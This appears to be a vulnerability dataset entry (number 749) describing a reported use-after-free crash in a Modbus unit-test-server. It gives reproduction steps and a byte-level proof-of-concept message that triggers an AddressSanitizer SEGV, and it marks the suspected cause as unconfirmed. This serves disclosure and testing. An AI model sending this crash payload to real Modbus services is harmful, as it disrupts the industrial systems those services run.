@@ -1,0 +1,12 @@
+Number: 749
+
+Summarize:
+A use-after-free vulnerability is reported in unit-test-server. It is triggered by sending a specific message to unit-test-server. The report says the issue appears to involve the ctx->backend pointer at line 171 in modbus.c being incorrectly modified after multiple calls or being used after free; this is presented as the author's suspected cause, not a confirmed root cause. The observed impact is a crash, with AddressSanitizer reporting a SEGV on an unknown address.
+
+Reproduce:
+1. Start unit-test-server.
+2. Send this PoC message to it: <00><00><00><00><00><0d><ff><03><01><62><00><01><00><00><00><00><00><0d><ff><17><01><62><00><01><00><68><00><01><02><aa><bd><00><01><02>.
+3. Observe that the server crashes; the documented result is: ==7657==ERROR: AddressSanitizer: SEGV on unknown address 0x605ffffffe90.
+
+Payload:
+00 00 00 00 00 0d ff 03 01 62 00 01 00 00 00 00 00 0d ff 17 01 62 00 01 00 68 00 01 02 aa bd 00 01 02
